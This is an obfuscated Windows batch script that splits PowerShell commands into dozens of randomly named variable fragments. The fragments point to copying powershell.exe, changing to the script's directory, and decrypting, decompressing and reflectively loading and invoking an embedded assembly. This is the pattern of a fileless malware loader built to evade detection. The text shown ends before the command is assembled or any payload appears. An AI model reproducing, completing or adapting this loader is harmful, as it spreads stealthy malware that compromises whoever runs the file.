@echo off
set "aHJTwPYqDL=\v"
set "VlVjnsocya=st"
set "JtbDgTAdFR=Wi"
set "LrfZegODkv=ow"
set "MNQgJeJQdy=rs"
set "jlNltbOccP=s\"
set "WxOEAwJOfS=Sy"
set "UQDiBeoxPM=we"
set "mCaZmajMxG=rS"
set "kFYriajvqs=xe"
set "JQpWIfvDkB=.e"
set "vWZRgDetgV=1."
set "waxszYpDYb=\W"
set "SjlCEJkvfF= /"
set "PMDREezAJJ=ws"
set "icDvbesPrL=ll"
set "TrzkBfoBYD=nd"
set "UVYTQYnfJv=0\"
set "sZpPMEIxyH=Po"
set "BTGiRjlfln=he"
set "pNjjFWfAkd=py"
set "OjYGYkMUNZ=:\"
set "IYFGOadRQQ=we"
set "WUKGamKBuT=co"
set "TmKUFTvbPK=po"
set "TvXFBJLNDY=do"
set "eWSjIIDoRz=em"
set "vQGiIwAtwu= C"
set "aooVqQhXcD=ll"
set "MTyrOLEJzM=y "
set "qmziGoCByH=32"
set "AfUmATghTX=he"
set "NMDbKZFEVS=in"
set "aVuImenqtY=cd"
set "StUYWHhprE= %~dp0"
set "HUyMOecbug=eam("
set "xgtbgcmSJC== [S"
set "qEbOHMHMps=::('"
set "xBOQLRipYF=();$"
set "nOeZGQIAtV=lBlo"
set "BCPWMLbiJb='dqR"
set "BTQeECicpQ=)($Z"
set "qDxqmPKSYo=gnir"
set "RbRbemHpGY=yste"
set "qdztNzYJcs=gth)"
set "GGVuDuEmby=$fxB"
set "SWPPBccADq=:: '"
set "swZKuwRTFO=lit("
set "TTmvYymPue=mkO "
set "mYghZfsoJx=$jYp"
set "KrKSQZPmHx=se()"
set "cPlKHqgaBo=ptog"
set "hwJNeSkxun=ispo"
set "eJDbcCeAHI=in $"
set "EBNJuFETmw=x = "
set "hZEvzSmUUS=Bmor"
set "kaVwVxievQ=U = "
set "KuuvhNayHd=Comp"
set "ekkBnHUYfl=ndEp"
set "CCJrEKeVlW=.Len"
set "HdCimVeuYK=();$"
set "apmQxcmpTY=Comp"
set "EUqQdKeBAS=Stre"
set "neQadNdECr=grap"
set "fDaAxeoCdp='[-1"
set "dsxierQwsw=oL'["
set "ikHMhowKHu=bjec"
set "SyxiQIfBFM=brea"
set "mHBmwMXyjI=ew-O"
set "OCWezeHoRD=vj0m"
set "ipihFZTiFG=ndEp"
set "DEWjdXuwBE=ode]"
set "dmNwaiDpco=t Sy"
set "PTRNIHawdp===')"
set "FFhEEdAKhX=Invo"
set "JeAAqWPlGr=-4] "
set "pungahDHEr=Syst"
set "PxpLtNNbOa=$tGo"
set "xfSNfwjQqn=Fo7l"
set "ujJyrvuPBX=).Sp"
set "oAWHYVHybQ=null"
set "iAaqWgeeqE=ect "
set "LtDBxEcFgx=flec"
set "dlMmJPZomL=7Yiv"
set "ByISbtXIkN=+hAO"
set "hhuPYLvAHM=yTo("
set "QfnUAXAVuL=ecry"
set "sYzzSKHtMQ=..-1"
set "AGgEOCRtPa=:('g"
set "YyltDZjfpy=ewLi"
set "eWnztKbmOV= '')"
set "qboZbbxvoa=raph"
